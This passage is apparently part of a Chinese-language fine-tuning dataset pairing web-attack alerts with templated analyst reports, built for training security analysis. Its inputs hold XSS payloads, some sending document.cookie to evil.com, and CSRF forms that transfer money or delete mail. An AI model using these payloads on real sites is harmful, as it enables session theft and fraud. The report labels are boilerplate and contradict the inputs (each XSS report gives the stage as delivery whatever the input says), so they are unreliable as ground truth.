+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 17,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.16.0.25\n目标IP地址: 10.0.0.2\n攻击时间: 2024-10-08 15:46:18\n\n攻击载荷:\n<img src=x onerror=alert('XSS')>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 18,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.1.1.15\n目标IP地址: 192.168.100.5\n攻击时间: 2024-10-08 15:47:25\n\n攻击载荷:\n<svg onload=fetch('http://evil.com/cookie='+document.cookie)>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 19,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.10\n目标IP地址: 10.0.0.3\n攻击时间: 2024-10-08 15:48:12\n\n攻击载荷:\n';alert('XSS');//",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 20,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.30\n目标IP地址: 10.0.0.4\n攻击时间: 2024-10-08 15:49:08\n\n攻击载荷:\n<iframe src=javascript:alert('XSS')>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 21,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.0.2.80\n目标IP地址: 10.0.0.5\n攻击时间: 2024-10-08 15:50:15\n\n攻击载荷:\n<body onload=alert('XSS')>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 22,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.20.0.50\n目标IP地址: 10.0.0.6\n攻击时间: 2024-10-08 15:51:22\n\n攻击载荷:\n<input onfocus=alert('XSS') autofocus>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 23,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.10.10.25\n目标IP地址: 192.168.1.5\n攻击时间: 2024-10-08 15:52:30\n\n攻击载荷:\n<script>location.href='http://evil.com/steal?cookie='+document.cookie</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 24,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.180\n目标IP地址: 10.0.0.7\n攻击时间: 2024-10-08 15:53:18\n\n攻击载荷:\n<script>console.log('XSS test')</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 25,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.95\n目标IP地址: 10.0.0.8\n攻击时间: 2024-10-08 15:54:25\n\n攻击载荷:\n<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 26,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.0.2.120\n目标IP地址: 10.0.0.9\n攻击时间: 2024-10-08 15:55:12\n\n攻击载荷:\n<style>@keyframes x{from{left:0}to{left:100%}}:target{animation:x 1s}</style>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 27,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.30.0.75\n目标IP地址: 10.0.0.10\n攻击时间: 2024-10-08 15:56:08\n\n攻击载荷:\n<script>new Image().src='http://evil.com/log?'+document.cookie</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 28,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 武器化\n威胁等级: 高风险\n网络协议: HTTP\n源IP地址: 10.20.20.50\n目标IP地址: 192.168.2.10\n攻击时间: 2024-10-08 15:57:15\n\n攻击载荷:\n<script>fetch('http://evil.com/steal',{method:'POST',body:JSON.stringify({cookie:document.cookie})})</script>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "武器化",
+      "threat_level": "高风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 29,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 侦察\n威胁等级: 低风险\n网络协议: HTTP\n源IP地址: 203.0.113.60\n目标IP地址: 10.0.0.11\n攻击时间: 2024-10-08 15:58:22\n\n攻击载荷:\n<!--<script>alert('XSS')</script>-->",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：低风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "侦察",
+      "threat_level": "低风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "低风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 30,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: XSS攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 198.51.100.140\n目标IP地址: 10.0.0.12\n攻击时间: 2024-10-08 15:59:30\n\n攻击载荷:\n<div style=background:url(javascript:alert('XSS'))>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起跨站脚本攻击(XSS)，攻击者通过注入恶意JavaScript代码，试图在用户浏览器中执行恶意脚本，窃取用户会话信息或执行恶意操作。\n\n技术细节：\n- XSS类型：反射型XSS\n- 注入方式：HTTP参数注入\n- 攻击载荷：包含恶意脚本代码\n- 目标浏览器：所有主流浏览器\n- 影响范围：访问恶意链接的用户\n\n**2. 威胁等级评估**\n- 当前威胁等级：高风险\n- 攻击复杂度：低（攻击门槛较低）\n- 潜在影响：中等（用户信息窃取、会话劫持）\n- 传播能力：高（可通过社交工程传播）\n\n**3. 攻击阶段分析**\n当前攻击处于\"投递\"阶段，攻击者已经：\n✓ 识别XSS漏洞点\n✓ 构造恶意载荷\n✓ 寻找传播途径\n下一步可能进行：钓鱼攻击、会话劫持、恶意软件传播\n\n**4. 防护建议**\n**立即措施：**\n- 检查Web应用XSS漏洞点\n- 监控异常的JavaScript执行\n- 验证用户会话完整性\n\n**技术防护：**\n- 实施内容安全策略(CSP)\n- 对所有用户输入进行HTML编码\n- 使用HttpOnly和Secure Cookie\n- 实施输入验证和输出编码\n\n**管理措施：**\n- 更新Web安全开发规范\n- 进行XSS安全测试\n- 建立XSS监控机制\n- 定期进行安全培训",
+    "metadata": {
+      "attack_type": "XSS攻击",
+      "attack_stage": "利用",
+      "threat_level": "高风险",
+      "protocol": "HTTPS",
+      "expected_threat_level": "高风险",
+      "expected_attack_category": "XSS攻击"
+    }
+  },
+  {
+    "sample_id": 31,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 投递\n威胁等级: 中风险\n网络协议: HTTP\n源IP地址: 192.168.1.75\n目标IP地址: 10.0.0.1\n攻击时间: 2024-10-08 16:00:10\n\n攻击载荷:\n<form action='http://bank.com/transfer' method='POST'><input type='hidden' name='to' value='hacker'><input type='hidden' name='amount' value='1000'></form>",
+    "target_output": "【Web攻击专家分析报告】\n\n**1. 攻击技术识别**\n这是一起Web攻击事件，攻击类型为CSRF攻击。\n\n技术分析：\n- 攻击载荷：<form action='http://bank.com/transfer' method='POST'><input type='hidden' name='to' value='hacker'><input type='hidden' name='amount' value='1000'></form>...\n- 攻击协议：HTTP\n- 攻击源：192.168.1.75\n\n**2. 威胁等级评估**\n- 当前威胁等级：中风险\n- 需要进一步技术分析来确定具体威胁程度\n\n**3. 攻击阶段分析**\n当前处于投递阶段\n\n**4. 防护建议**\n- 立即分析攻击载荷特征\n- 加强Web应用安全监控\n- 更新安全防护策略",
+    "metadata": {
+      "attack_type": "CSRF攻击",
+      "attack_stage": "投递",
+      "threat_level": "中风险",
+      "protocol": "HTTP",
+      "expected_threat_level": "中风险",
+      "expected_attack_category": "CSRF攻击"
+    }
+  },
+  {
+    "sample_id": 32,
+    "expert_type": "web_attack",
+    "input_text": "攻击类型: CSRF攻击\n攻击阶段: 利用\n威胁等级: 高风险\n网络协议: HTTPS\n源IP地址: 172.16.0.35\n目标IP地址: 10.0.0.2\n攻击时间: 2024-10-08 16:01:18\n\n攻击载荷:\n<img src='http://mail.com/delete?message=all'>",
